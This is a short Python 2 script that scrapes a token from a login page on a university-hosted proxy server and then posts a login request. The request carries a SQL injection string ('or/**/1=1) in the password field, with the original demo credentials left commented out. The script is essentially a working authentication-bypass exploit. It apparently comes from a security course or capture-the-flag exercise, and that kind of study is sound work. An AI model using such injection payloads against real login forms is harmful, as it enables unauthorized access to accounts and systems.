#!/usr/bin/env python

import sys

try:
    import requests
except ImportError:
    print >> sys.stderr, "requests package is missing!"
    sys.exit(-3)

try:
    from pyquery import PyQuery as pq
except ImportError, exc:
    print exc
    print >> sys.stderr, "pyquery package is missing!"
    sys.exit(-4)

loginpage = "http://cloaknet.csc.kth.se:8080/proxy.jsp"


def parse_page():
    # get loginpage

    s = requests.Session()
    r = s.get(loginpage)


    # extract token
    data = r.content
    d = pq(data)
    token = d("#token")
    token = token.attr["value"]
    # payload = {"user": "demo", "pass": "demo", "login": "1", "asd": "Login", "token": token}
    payload = {"userx": "demo;;;;dd", "pass": "'or/**/1=1", "login": "1", "asd": "Login", "token": None}
    r = s.post(loginpage, data=payload)
    print r.status_code
    print r.text



if __name__ == "__main__":
    parse_page()
